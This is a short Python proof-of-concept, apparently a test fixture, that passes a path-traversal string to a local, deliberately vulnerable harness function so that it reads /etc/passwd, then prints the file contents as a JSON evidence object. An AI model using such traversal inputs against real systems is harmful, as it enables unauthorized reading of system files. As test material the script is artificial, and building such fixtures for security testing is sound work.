"""Deterministic path traversal PoC for the MockLLM floor and tests.

Uses traversal_harness in the same directory. Prints one JSON
evidence object as its last line. Stdlib only. Targets
/etc/passwd, a public system file, from the repo directory.
"""

import json
import os

import traversal_harness

content = traversal_harness.vulnerable_read(
    os.getcwd(), "../../../../../../../../etc/passwd"
)
print(json.dumps({
    "content": content[:2000],
    "target_file": "/etc/passwd",
}))
